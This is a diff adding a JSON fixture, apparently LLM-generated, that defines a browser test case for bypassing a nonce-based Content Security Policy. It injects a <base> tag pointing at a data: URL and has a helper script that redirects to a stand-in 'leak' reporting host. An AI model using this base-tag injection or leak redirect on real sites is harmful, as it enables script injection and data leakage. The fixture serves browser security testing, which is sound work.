@@ -1,0 +1,4 @@
+{"c689412": {"url_queue.txt": "https://leak.test/CSP/c689412/main\nhttps://a.test/report/?leak=baseline\n", "leak.test": {"main": {"index.html": "<html>\n<head>\n<meta http-equiv=\"content-security-policy\" content=\"object-src 'none';script-src 'nonce-random-secret'\">\n<title>Fake XSS</title>\n<base href=\"data:/,-alert(1)/\">\n</head>\n<body>\n<script src=\"./helper\" nonce=\"random-secret\"></script>\n</body>\n</html>\n"}}, "a.test": {"helper": {"index.js": "document.location.href = \"https://a.test/report/?leak=c689412\";\n"}}}}
+
+
+Prompt tokens: 21479Completion tokens: 165Total tokens: 21644
